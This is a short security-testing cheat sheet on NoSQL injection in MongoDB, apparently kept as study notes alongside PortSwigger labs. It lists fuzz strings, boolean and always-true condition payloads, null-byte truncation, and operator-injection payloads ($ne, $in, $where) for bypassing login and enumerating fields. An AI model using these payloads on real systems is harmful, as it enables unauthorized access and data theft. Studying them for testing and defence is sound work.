# NoSQL Injections

## Detecting NoSQL Injections in MongoDB
Test the following strings by submitting them where you think a MongoDB statement is used on the backend:
- ```'"\`{```
- ```;$Foo}```
- ```$Foo \xYZ```
These strings try to break the MongoDB syntax and should result in a different response then what is expected.

### If Submitting Fuzz Strings as JSON Use The Following Instead
```'\"\`{\r;$Foo}\n$Foo \\xYZ\u0000```

### Confirming Conditional Behavior
After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements:
`' && 0 && 'x` and `' && 1 && 'x`

### Overriding Existing Conditions
Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`

 You could also add a null character after the target value `'%00`. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored

## NoSQL Operator Injection
### Availalble Operators
- `$where`
- `$ne` (not equal)
- `$eq` (equal)
- `$in` (followed by an array)
- `$regex`
- `$lt` (less than)
- `$gt` (greater than)

### Example Payloads
#### JSON Format
```json
{
	"username": { "$ne": "invalid" }
}
```
```json
{
	"username": { "$in" : ["admin", "administrator", "superuser", "superadmin"] }
	"password": { "$ne" : "invalid" }
}
```
#### Form URL Encoded Format
`username[$ne]=invalidusername&password[$ne]=invalidpassword`

### Injecting Javascript With "$where"
If NoSQL injection is possible then we might be able to inject JS code using the "$where" property
Ex: To enumerate the properties of `Object` we can use the following. [Review the solution of this portswigger lab](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields)
`"$where": "Object.keys(this)[1].match('^.{}.*')"`

## Extra Resources
- [Portswigger NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [Intigriti Guide to NoSQL Injection](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-nosql-injection-nosqli-vulnerabilities)
